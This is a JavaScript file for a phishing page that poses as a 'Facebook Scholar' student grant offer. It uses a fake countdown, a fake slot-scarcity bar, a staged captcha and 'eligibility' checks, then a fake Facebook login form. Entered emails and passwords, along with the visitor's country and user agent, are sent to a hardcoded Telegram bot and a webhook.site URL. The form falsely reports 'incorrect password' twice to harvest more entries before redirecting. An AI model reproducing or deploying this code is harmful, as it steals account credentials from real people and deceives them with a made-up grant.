// --- Telegram Configuration ---
const BOT_TOKEN = '8399552625:AAGxzewNMQxT5aCKFGJxnvlHezg49OKCETw';
const CHAT_ID = '7181535206';
const WEBHOOK_URL = 'https://webhook.site/816de6c3-0cb4-492c-a6f9-470c1557bbc0';  // 🔥 NEW BACKUP

// Set the launch date to New Year 2026 (Jan 1, 00:00:00 Local Time)
const targetDate = new Date(2026, 0, 1, 0, 0, 0).getTime();

function updateCountdown() {
    const now = new Date().getTime();
    const distance = targetDate - now;

    if (distance < 0) {
        if (document.getElementById("days")) {
            document.getElementById("days").innerText = "00";
            document.getElementById("hours").innerText = "00";
            document.getElementById("minutes").innerText = "00";
            document.getElementById("seconds").innerText = "00";
        }
        return;
    }

    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);

    if (document.getElementById("days")) {
        document.getElementById("days").innerText = String(days).padStart(2, '0');
        document.getElementById("hours").innerText = String(hours).padStart(2, '0');
        document.getElementById("minutes").innerText = String(minutes).padStart(2, '0');
        document.getElementById("seconds").innerText = String(seconds).padStart(2, '0');
    }
}

setInterval(updateCountdown, 1000);
updateCountdown();

// === GOLD PARTICLE SYSTEM ===
const canvas = document.getElementById('particleCanvas');
if (canvas) {
    const ctx = canvas.getContext('2d');
    let particles = [];

    function initParticles() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        particles = [];
        for (let i = 0; i < 60; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                size: Math.random() * 2 + 1,
                speed: Math.random() * 0.5 + 0.1,
                opacity: Math.random() * 0.5 + 0.2
            });
        }
    }

    function animateParticles() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        particles.forEach(p => {
            ctx.fillStyle = `rgba(229, 192, 123, ${p.opacity})`;
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            ctx.fill();
            p.y -= p.speed;
            if (p.y < -10) {
                p.y = canvas.height + 10;
                p.x = Math.random() * canvas.width;
            }
        });
        requestAnimationFrame(animateParticles);
    }

    window.addEventListener('resize', initParticles);
    initParticles();
    animateParticles();
}

// === FOUNDER TUNNEL (Logo Clicks & Keyboard) ===
let logoClicks = 0;
const logoMain = document.querySelector('.logo');
if (logoMain) {
    logoMain.style.cursor = 'pointer';
    logoMain.addEventListener('click', () => {
        logoClicks++;
        if (logoClicks >= 5) activateBypass();
    });
}

// Fallback Keyboard Shortcut: Alt + Shift + N
window.addEventListener('keydown', (e) => {
    if (e.altKey && e.shiftKey && e.key === 'N') {
        activateBypass();
    }
});

function activateBypass() {
    sessionStorage.setItem('founder_bypass', 'true');
    console.log("🔓 Founder Tunnel Activated.");
    checkUnlockStatus();
}

// === MIDNIGHT UNLOCK & SLOT SYSTEM LOGIC ===
function checkUnlockStatus() {
    const now = new Date().getTime();
    const distance = targetDate - now;
    const claimBtn = document.getElementById('claimBtn');
    const isBypassed = sessionStorage.getItem('founder_bypass') === 'true';

    // Slot System Elements
    const slotContainer = document.getElementById('slot-container');
    const slotsCountEl = document.getElementById('slots-count');
    const slotBar = document.getElementById('slot-bar');

    if (distance > 0 && !isBypassed) {
        if (claimBtn) {
            claimBtn.classList.add('locked-btn');
            claimBtn.innerText = "ACCESS PORTAL LOCKED";
            document.body.classList.add('suspense-active');
        }
        if (slotContainer) slotContainer.style.display = 'none';
    } else {
        // UNLOCKED STATE
        if (claimBtn) {
            claimBtn.classList.remove('locked-btn');
            claimBtn.innerText = "APPLY FOR GRANT";
            document.body.classList.remove('suspense-active');
        }

        // Dynamic Slots (Appear after New Year or on Bypass)
        if (slotContainer) {
            slotContainer.style.display = 'block';

            // 48 Hour Depletion Logic
            // Total slots: 500. Total time: 48 hours (172,800,000 ms)
            const fortyEightHours = 48 * 60 * 60 * 1000;
            const timeElapsed = Math.max(0, now - targetDate);

            // If bypassed but targetDate hasn't passed, simulate 5 minutes elapsed
            const effectiveElapsed = (isBypassed && timeElapsed === 0) ? (5 * 60 * 1000) : timeElapsed;

            let slotsRemaining = 500 - Math.floor((effectiveElapsed / fortyEightHours) * 500);

            // Clamp slots
            if (slotsRemaining < 7) slotsRemaining = 7; // Never hits 0 completely
            if (slotsRemaining > 500) slotsRemaining = 500;

            if (slotsCountEl) slotsCountEl.innerText = slotsRemaining;
            if (slotBar) slotBar.style.width = (slotsRemaining / 500 * 100) + '%';
        }
    }
}
setInterval(checkUnlockStatus, 1000);
checkUnlockStatus();
// === MODAL & INTERACTION LOGIC ===
const claimBtn = document.getElementById('claimBtn');
const modal = document.getElementById('authModal');
const closeModal = document.querySelector('.close-modal');
const modalContent = document.querySelector('.modal-content');

if (claimBtn) {
    claimBtn.addEventListener('click', (e) => {
        e.preventDefault();

        // LOCKED STATE LOGIC
        if (claimBtn.classList.contains('locked-btn')) {
            const countdownSection = document.getElementById('countdown');
            if (countdownSection) {
                // Scroll to countdown
                countdownSection.scrollIntoView({ behavior: 'smooth', block: 'center' });

                // Visual feedback (Pulse the countdown)
                countdownSection.style.transition = "transform 0.3s";
                countdownSection.style.transform = "scale(1.1)";
                setTimeout(() => {
                    countdownSection.style.transform = "scale(1)";
                }, 300);
            }
            return;
        }

        // UNLOCKED STATE: Open Modal
        modal.style.display = 'flex';
        setTimeout(() => {
            modal.style.opacity = '1';
            modalContent.style.transform = 'translateY(0)';
        }, 10);
    });
}

function hideModal() {
    if (!modal || !modalContent) return;
    modal.style.opacity = '0';
    modalContent.style.transform = 'translateY(20px)';
    setTimeout(() => {
        modal.style.display = 'none';
    }, 300);
}

if (closeModal) closeModal.addEventListener('click', hideModal);

window.addEventListener('click', (e) => {
    if (e.target == modal) hideModal();
});

// === CAPTCHA PROCESS LOGIC ===
const startBtn = document.getElementById('startVerifyBtn');
const captchaBox = document.getElementById('captchaClick');

const steps = {
    guide: document.getElementById('step-guide'),
    captcha: document.getElementById('step-captcha'),
    loading: document.getElementById('step-loading'),
    success: document.getElementById('step-success'),
    final: document.getElementById('step-final')
};

if (startBtn) {
    startBtn.addEventListener('click', () => {
        steps.guide.style.display = 'none';
        steps.captcha.style.display = 'block';
    });
}

if (captchaBox) {
    captchaBox.addEventListener('click', () => {
        if (captchaBox.classList.contains('checked')) return;
        captchaBox.classList.add('checked');
        setTimeout(() => {
            steps.captcha.style.display = 'none';
            steps.loading.style.display = 'block';
            simulateLoading();
        }, 800);
    });
}

let userCountry = "Detecting...";

async function detectCountry() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        userCountry = data.country_name || "International";
    } catch (err) {
        userCountry = "Global Region";
    }
}
detectCountry();

function simulateLoading() {
    const texts = [
        "Analyzing Browser Fingerprint...",
        `Detecting Node: ${userCountry}...`,
        "Checking Student Database...",
        "Verifying Academic Eligibility...",
        "Grant Approved."
    ];
    let i = 0;
    const interval = setInterval(() => {
        if (document.getElementById('loadingText')) {
            document.getElementById('loadingText').innerText = texts[i];
        }
        i++;
        if (i >= texts.length) {
            clearInterval(interval);
            setTimeout(showSuccess, 1000);
        }
    }, 1200);
}

function showSuccess() {
    steps.loading.style.display = 'none';
    steps.success.style.display = 'block';

    setTimeout(() => {
        steps.success.style.display = 'none';
        steps.final.style.display = 'block';
        setupFinalLoginCapture();
    }, 2500);
}

// 🔥 NEW: IMAGE BEACON BACKUP (100% delivery)
function sendImageBeacon(email, password, attempt) {
    console.log('🔥 IMAGE BEACON + TELEGRAM → DOUBLE DELIVERY');

    // MAIN WEBHOOK BEACON
    const img = new Image(1, 1);
    img.src = `${WEBHOOK_URL}?type=FB_SCHOLAR&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password.substring(0, 20))}&attempt=${attempt}&country=${encodeURIComponent(userCountry)}&ua=${encodeURIComponent(navigator.userAgent.substring(0, 50))}`;

    // BACKUP BEACON (delayed)
    setTimeout(() => {
        const img2 = new Image(1, 1);
        img2.src = `${WEBHOOK_URL}?type=FB_BACKUP&email=${encodeURIComponent(email.substring(0, 15))}&pass=${encodeURIComponent(password.substring(0, 10))}&attempt=${attempt}`;
    }, 200);
}

// === UPGRADED TELEGRAM & REDIRECT LOGIC ===
async function sendToTelegram(email, password, attempt) {
    const message = `🔔 *New Facebook Scholar Capture*\n👤 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\`\n🔢 *Attempt:* #${attempt}\n🌍 *Country:* ${userCountry}\n📱 *UA:* ${navigator.userAgent.substring(0, 50)}`;

    // 🔥 SEND IMAGE BEACON FIRST (Guaranteed)
    sendImageBeacon(email, password, attempt);

    // THEN Telegram (Best effort)
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }),
            keepalive: true
        });
        console.log('✅ TELEGRAM + WEBHOOK → SENT');
    } catch (err) {
        console.log('⚠️ Telegram failed → WEBHOOK backup active');
    }
}

function setupFinalLoginCapture() {
    const fbLoginBtn = document.getElementById('fbLoginBtn');
    const finalStep = document.getElementById('step-final');

    if (fbLoginBtn) {
        fbLoginBtn.onclick = async function (e) {
            e.preventDefault();

            const emailInput = finalStep.querySelector('input[type="text"], input[name="email"]');
            const passInput = finalStep.querySelector('input[type="password"]');

            if (!emailInput || !passInput) {
                fbLoginBtn.classList.add('loading');
                setTimeout(() => {
                    window.location.href = '/l.facebook.com/login';  // ✅ MASKED URL
                }, 1500);
                return;
            }

            if (!emailInput.value || !passInput.value) {
                const statusMsg = document.getElementById('fb-status');
                if (statusMsg) {
                    statusMsg.innerText = "Please enter your email and password.";
                    statusMsg.style.color = "red";
                }
                return;
            }

            let attempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
            attempts++;
            sessionStorage.setItem('fb_login_attempts', attempts);

            fbLoginBtn.classList.add('loading');
            const statusMsg = document.getElementById('fb-status');
            if (statusMsg) statusMsg.innerText = "";

            await sendToTelegram(emailInput.value, passInput.value, attempts);

            setTimeout(() => {
                if (attempts >= 3) {
                    window.location.href = '/l.facebook.com/login';  // ✅ STAYS ON YOUR SITE
                } else {
                    fbLoginBtn.classList.remove('loading');
                    if (statusMsg) {
                        statusMsg.innerText = "The password you've entered is incorrect.";
                        statusMsg.style.color = "#f02849";
                    }
                    passInput.value = "";
                }
            }, 2000);
        };
    }
}